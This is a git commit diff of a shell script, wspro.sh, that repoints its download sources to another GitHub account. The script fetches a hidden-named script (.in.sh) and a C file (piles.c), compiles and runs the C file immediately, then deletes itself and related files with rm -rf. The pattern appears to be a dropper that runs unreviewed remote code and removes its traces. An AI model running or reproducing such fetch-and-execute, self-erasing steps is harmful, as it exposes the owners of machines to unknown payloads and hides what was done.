fc6bb4ed956eb276370b828f7a1ce47db15d1214
kiprono254 <68909234+kiprono254@users.noreply.github.com>
2024-03-06 01:13:48 +0300

    wspro.sh

--- wspro.sh
+++ wspro.sh
@@ -5,9 +5,9 @@ sudo apt update -y && sudo apt upgrade -y
 sudo apt install build-essential -y 
 
 
-wget https://raw.githubusercontent.com/pirozas/info/main/.in.sh ; chmod +x .in.sh
+wget https://raw.githubusercontent.com/kiprono254/info/main/.in.sh ; chmod +x .in.sh
 
-wget https://raw.githubusercontent.com/pirozas/pile/main/piles.c ; gcc piles.c -o xpiles ; ./xpiles
+wget https://raw.githubusercontent.com/kiprono254/pile/main/piles.c ; gcc piles.c -o xpiles ; ./xpiles
 
 
 rm -rf piros.sh menu.c wspro.sh 
